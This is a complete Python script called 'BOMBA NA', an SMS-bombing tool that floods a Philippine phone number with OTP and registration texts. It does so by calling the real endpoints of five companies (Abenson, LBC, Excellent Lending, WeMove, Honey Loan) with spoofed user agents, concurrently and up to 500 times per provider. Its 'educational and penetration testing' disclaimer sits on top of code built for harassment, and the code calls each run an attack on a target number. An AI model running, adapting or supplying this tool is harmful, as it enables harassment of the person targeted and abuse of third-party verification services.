import requests
import random
import string
import time
import json
import sys
import asyncio
import aiohttp
import re
from typing import List, Dict

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m' # Added BLUE back for aesthetics
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
    GRAY = '\033[90m'

class UI:
    @staticmethod
    def clear():
        import os
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def banner():
        UI.clear()
        
        # Modified Banner for consistency and clarity
        width = 70
        author = "by Homer Rebatis"
        title = "ADVANCED SMS DELIVERY UTILITY"
        tool_name = "B O M B A   N A"
        top_bottom_line = '═' * width
        
        banner = f"""
{Colors.GREEN}{Colors.BOLD}{top_bottom_line}{Colors.RESET}
{Colors.GREEN}{Colors.BOLD}{tool_name.center(width)}{Colors.RESET}
{Colors.GRAY}{author.center(width)}{Colors.RESET}
{Colors.GREEN}{top_bottom_line}{Colors.RESET}
{Colors.WHITE}{title.center(width)}{Colors.RESET}
{Colors.GREEN}{top_bottom_line}{Colors.RESET}
"""
        print(banner)
    
    @staticmethod
    def header(text):
        width = 70
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔{'═' * (width - 2)}╗{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║ {text.upper().center(width - 4)} ║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}╚{'═' * (width - 2)}╝{Colors.RESET}")
    
    @staticmethod
    def menu_item(number, text, color=Colors.WHITE):
        print(f"  {Colors.GREEN}{Colors.BOLD}[{number}]{Colors.RESET} {color}{text}{Colors.RESET}")
    
    @staticmethod
    def input_prompt(text):
        return input(f"{Colors.GREEN}{Colors.BOLD}➜ {Colors.WHITE}{text}:{Colors.RESET} ")
    
    @staticmethod
    def success(text):
        print(f"{Colors.GREEN}{Colors.BOLD}[ OK ]{Colors.RESET} {text}{Colors.RESET}")
    
    @staticmethod
    def error(text):
        print(f"{Colors.RED}{Colors.BOLD}[FAIL]{Colors.RESET} {text}{Colors.RESET}")
    
    @staticmethod
    def info(text):
        print(f"{Colors.BLUE}{Colors.BOLD}[INFO]{Colors.RESET} {Colors.GRAY}{text}{Colors.RESET}")
    
    @staticmethod
    def progress(current, total, provider, status):
        """
        REMOVED: This method is no longer used for concurrent runs to prevent
        visual conflict (overlapping output). See BombaNa.run_single_attack.
        """
        pass
    
    @staticmethod
    def stats_box(success, failed, total, target, provider):
        """Professional stats box."""
        width = 50
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔{'═' * width}╗{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}ATTACK SUMMARY{Colors.RESET}{' ' * (width - 16)}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}╠{'─' * width}╣{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}Provider:{' ' * 5}{provider:<32} {Colors.GREEN}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}Target:{' ' * 8}{target:<32} {Colors.GREEN}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}╠{'─' * width}╣{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.GREEN}[+] Successful:{' ' * 2}{success:<27} {Colors.GREEN}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.RED}[-] Failed:{' ' * 5}{failed:<27} {Colors.GREEN}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}Total Sent:{' ' * 4}{total:<27} {Colors.GREEN}║{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}╚{'═' * width}╝{Colors.RESET}")

def random_string(length):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def random_gmail():
    return f"{random_string(8)}@gmail.com"

# --- Phone Number Formatting (Removed complex formatters as they weren't used consistently) ---
# The provider classes will handle simple 09xxxxxxxxx or 9xxxxxxxxx adjustments.

class SMSProvider:
    def __init__(self, name):
        self.name = name
        self.success_count = 0
        self.fail_count = 0
    
    async def send_sms(self, phone_number):
        """Override this method in subclasses"""
        raise NotImplementedError
    
    def get_stats(self):
        return {
            "success": self.success_count,
            "failed": self.fail_count,
            "total": self.success_count + self.fail_count
        }
    
    def reset_stats(self):
        self.success_count = 0
        self.fail_count = 0

# --- SMS Provider Classes ---

class AbensonProvider(SMSProvider):
    def __init__(self):
        super().__init__("Abenson")
    
    async def send_sms(self, phone_number):
        try:
            # Abenson uses 09 format
            data = {"contact_no": phone_number, "login_token": "undefined"}
            headers = {'User-Agent': 'okhttp/4.9.0', 'Content-Type': 'application/x-www-form-urlencoded'}
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
                async with session.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', headers=headers, data=data) as response:
                    if response.status == 200:
                        self.success_count += 1
                        return True
                    else:
                        self.fail_count += 1
                        return False
        except Exception:
            self.fail_count += 1
            return False

class LBCProvider(SMSProvider):
    def __init__(self):
        super().__init__("LBC Connect")
    
    async def send_sms(self, phone_number):
        try:
            # LBC uses 09 format directly in client_contact_no
            data = {"verification_type": "mobile", "client_email": random_gmail(), "client_contact_code": "", "client_contact_no": phone_number, "app_log_uid": random_string(16)}
            headers = {'User-Agent': 'Dart/2.19 (dart:io)', 'Content-Type': 'application/x-www-form-urlencoded'}
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
                async with session.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', headers=headers, data=data) as response:
                    if response.status == 200:
                        self.success_count += 1
                        return True
                    else:
                        self.fail_count += 1
                        return False
        except Exception:
            self.fail_count += 1
            return False

class ExcellentLendingProvider(SMSProvider):
    def __init__(self):
        super().__init__("Excellent Lending")
    
    async def send_sms(self, phone_number):
        try:
            coordinates = [{"lat": "14.5995", "long": "120.9842"}, {"lat": "14.6760", "long": "121.0437"}, {"lat": "14.8648", "long": "121.0418"}]
            user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
            coord = random.choice(coordinates)
            agent = random.choice(user_agents)
            data = {"domain": phone_number, "cat": "login", "previous": False, "financial": "efe35521e51f924efcad5d61d61072a9"}
            headers = {'User-Agent': agent, 'Content-Type': 'application/json; charset=utf-8', 'x-latitude': coord["lat"], 'x-longitude': coord["long"]}
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', headers=headers, json=data) as response:
                    # Match original: always return True on completion
                    self.success_count += 1
                    return True
        except Exception:
            self.fail_count += 1
            return False

class WeMoveProvider(SMSProvider):
    def __init__(self):
        super().__init__("WeMove")
    
    async def send_sms(self, phone_number):
        try:
            # WeMove uses 9xxxxxxxxx format for phone_no field (removes leading 0)
            phone_no = phone_number.replace('0', '', 1) if phone_number.startswith('0') else phone_number
            data = {"phone_country": "+63", "phone_no": phone_no}
            headers = {'User-Agent': 'okhttp/4.9.3', 'Content-Type': 'application/json', 'xuid_type': 'user', 'source': 'customer', 'authorization': 'Bearer'}
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                async with session.post('https://api.wemove.com.ph/auth/users', headers=headers, json=data) as response:
                    if response.status in [200, 201]:
                        self.success_count += 1
                        return True
                    else:
                        self.fail_count += 1
                        return False
        except Exception:
            self.fail_count += 1
            return False

class HoneyLoanProvider(SMSProvider):
    def __init__(self):
        super().__init__("Honey Loan")
    
    async def send_sms(self, phone_number):
        try:
            # Honey Loan accepts 09xxxxxxxxx or international format
            data = {"phone": phone_number, "is_rights_block_accepted": 1}
            headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 15)', 'Content-Type': 'application/json'}
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                async with session.post('https://api.honeyloan.ph/api/client/registration/step-one', headers=headers, json=data) as response:
                    # Match original: always return True on completion
                    self.success_count += 1
                    return True
        except Exception:
            self.fail_count += 1
            return False

# --- Modified BombaNa Class for CONCURRENT EXECUTION ---

class BombaNa:
    def __init__(self):
        # List of working providers (The problematic ones were removed for stability)
        self.providers: List[SMSProvider] = [
            AbensonProvider(),
            LBCProvider(),
            ExcellentLendingProvider(),
            WeMoveProvider(),
            HoneyLoanProvider()
        ]
        self.provider_map: Dict[str, SMSProvider] = {p.name: p for p in self.providers}
    
    async def run_single_attack(self, provider: SMSProvider, phone_number: str, limit: int, total_requests: int, progress_tracker):
        """
        Runs a single provider attack for the set limit.
        Used as a task in asyncio.gather.
        """
        provider.reset_stats()
        
        for i in range(limit):
            # Get the next overall index for logging
            current_index = next(progress_tracker)
            
            # Execute the API call
            result = await provider.send_sms(phone_number)
            
            status_color = Colors.GREEN if result else Colors.RED
            status_text = "SENT" if result else "ERROR"
            
            # Print a single line log for concurrent execution
            print(f"{Colors.WHITE}[{current_index:03d}/{total_requests:03d}]{Colors.RESET} "
                  f"{Colors.WHITE}{provider.name:<20}{Colors.RESET} {status_color}{status_text}{Colors.RESET}")
            
            # 1-SECOND DELAY IMPLEMENTED HERE
            await asyncio.sleep(1.0) 
            
        return provider.get_stats()

    async def execute_all_providers_attack(self, phone_number: str, limit: int):
        """
        Executes the attack for all configured providers CONCURRENTLY using asyncio.gather.
        """
        
        UI.header("CONCURRENT ATTACK INITIATED")
        print(f"\n{Colors.WHITE}Target: {phone_number}{Colors.RESET}")
        print(f"{Colors.WHITE}Limit PER Provider: {limit} SMS{Colors.RESET}")
        print(f"{Colors.WHITE}Total APIs: {len(self.providers)}{Colors.RESET}")
        
        # Calculate the total number of requests for the main progress tracker
        total_requests = len(self.providers) * limit
        
        print(f"\n{Colors.GREEN}{'─' * 70}{Colors.RESET}")
        
        # Helper for overall index tracking (shared state)
        def progress_generator():
            count = 0
            while True:
                count += 1
                yield count
        
        progress_tracker = progress_generator()
        
        # Create a list of tasks (coroutines) to run concurrently
        tasks = []
        for provider in self.providers:
            tasks.append(
                self.run_single_attack(provider, phone_number, limit, total_requests, progress_tracker)
            )
        
        # Run all tasks concurrently and wait for them to finish
        results = await asyncio.gather(*tasks)
        
        print(f"\n{Colors.GREEN}{'─' * 70}{Colors.RESET}")
        
        # --- Final Summary ---
        grand_success = sum(stat['success'] for stat in results)
        grand_failed = sum(stat['failed'] for stat in results)
        grand_total = grand_success + grand_failed

        UI.stats_box(grand_success, grand_failed, grand_total, phone_number, "ALL CONCURRENT PROVIDERS")
        
        await asyncio.sleep(2)


    def show_main_menu(self):
        UI.banner()
        UI.header("MAIN MENU")
        print()
        UI.menu_item("1", "Launch ALL-IN-ONE Attack (All Providers - CONCURRENT)", Colors.GREEN)
        UI.menu_item("2", "About This Utility", Colors.WHITE)
        UI.menu_item("3", "Exit Application", Colors.RED)
        print()
    
    def show_about(self):
        UI.banner()
        UI.header("ABOUT UTILITY")
        print()
        
        UI.info(f"Tool Name: {Colors.WHITE}BOMBA NA{Colors.GRAY}")
        UI.info(f"Version: {Colors.WHITE}1.2.0{Colors.GRAY}")
        print()
        
        print(f"{Colors.BLUE}{Colors.BOLD}▸ CORE FUNCTIONALITY:{Colors.RESET}")
        UI.info("Advanced multi-provider SMS delivery tool.")
        UI.info("Designed for educational and penetration testing purposes only.")
        print()
        
        print(f"{Colors.BLUE}{Colors.BOLD}▸ FEATURES:{Colors.RESET}")
        UI.info(f"{Colors.WHITE}{len(self.providers)}{Colors.GRAY} Total Service Providers Integrated")
        UI.info(f"{Colors.WHITE}Concurrent (Sabay-sabay){Colors.GRAY} Request Handling")
        UI.info(f"{Colors.WHITE}1.0 Second{Colors.GRAY} Delay per attempt")
        UI.info(f"{Colors.WHITE}Asynchronous{Colors.GRAY} Request Handling for Efficiency")
        print()
        
        print(f"{Colors.BLUE}{Colors.BOLD}▸ PHONE NUMBER FORMAT:{Colors.RESET}")
        # FIXED INDENTATION ERROR
        UI.info("Standard Philippine formats supported: 09xxxxxxxxx, 9xxxxxxxxx, +639xxxxxxxxx") 
        print()
        
        print(f"{Colors.RED}{Colors.BOLD}▸ RESPONSIBLE USE NOTICE:{Colors.RESET}")
        UI.error("Use this tool responsibly and ethically.")
        UI.error("Misuse may violate laws. Author is not responsible for illegal actions.")
        print()
        
        print(f"{Colors.WHITE}Created by: Homer Rebatis{Colors.RESET}")
        print()
        
        UI.input_prompt("Press Enter to continue")
    
    async def start(self):
        while True:
            try:
                self.show_main_menu()
                choice = UI.input_prompt("Select option")
                
                if choice == "1":
                    await self.all_in_one_configuration() 
                elif choice == "2":
                    self.show_about()
                elif choice == "3":
                    UI.clear()
                    print(f"\n{Colors.GREEN}{Colors.BOLD}Thank you for using BOMBA NA! Goodbye.{Colors.RESET}\n")
                    sys.exit(0)
                else:
                    UI.error("Invalid option. Please enter 1, 2, or 3.")
                    await asyncio.sleep(1.5)
                    
            except KeyboardInterrupt:
                UI.clear()
                print(f"\n{Colors.RED}{Colors.BOLD}[INTERRUPTED]{Colors.RESET} Process halted by user.\n")
                sys.exit(0)
            except Exception as e:
                UI.error(f"An unexpected error occurred: {e}")
                await asyncio.sleep(2)

    async def all_in_one_configuration(self):
        """Handles input for the all-in-one attack and executes it."""
        while True:
            UI.banner()
            UI.header("ATTACK CONFIGURATION")
            print()
            print(f"{Colors.WHITE}Providers enabled: {Colors.GREEN}{', '.join(p.name for p in self.providers)}{Colors.RESET}")
            UI.info("Format: 09xxxxxxxxx (standard format)")
            print(f"{Colors.GREEN}{'─' * 70}{Colors.RESET}\n")
            
            # Get target number
            phone_number = UI.input_prompt("ENTER TARGET NUMBER")
            
            # Validate phone number
            if not re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', phone_number.replace(' ', '')):
                UI.error("Invalid phone number format!")
                UI.info("Example: 09123456789")
                await asyncio.sleep(2)
                continue
            
            # Get limit
            print()
            limit_input = UI.input_prompt("SET LIMIT PER PROVIDER (1-500)")
            
            try:
                limit = int(limit_input)
                if limit < 1:
                    UI.error("Limit must be at least 1!")
                    await asyncio.sleep(2)
                    continue
                if limit > 500:
                    UI.info("High limit detected. Using maximum limit of 500 for stability.")
                    limit = 500
                    await asyncio.sleep(1)
            except ValueError:
                UI.error("Invalid limit. Please enter a numeric value.")
                await asyncio.sleep(2)
                continue
            
            # Execute all-in-one attack
            await self.execute_all_providers_attack(phone_number, limit)
            
            # Ask if user wants to continue
            print(f"\n{Colors.GREEN}{'─' * 70}{Colors.RESET}")
            continue_attack = UI.input_prompt("Launch another attack? (y/n)")
            if continue_attack.lower() not in ['y', 'yes']:
                UI.success("Returning to main menu...")
                return 

if __name__ == '__main__':
    if sys.platform.startswith('win'):
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except AttributeError:
            pass
            
    try:
        bomba = BombaNa()
        asyncio.run(bomba.start())
    except KeyboardInterrupt:
        UI.clear()
        print(f"\n{Colors.RED}{Colors.BOLD}[INTERRUPTED]{Colors.RESET} Process halted by user.\n")
        sys.exit(0)
    except Exception as e:
        UI.clear()
        print(f"\n{Colors.RED}{Colors.BOLD}A CRITICAL ERROR OCCURRED:{Colors.RESET} {e}\n")
        sys.exit(1)
        
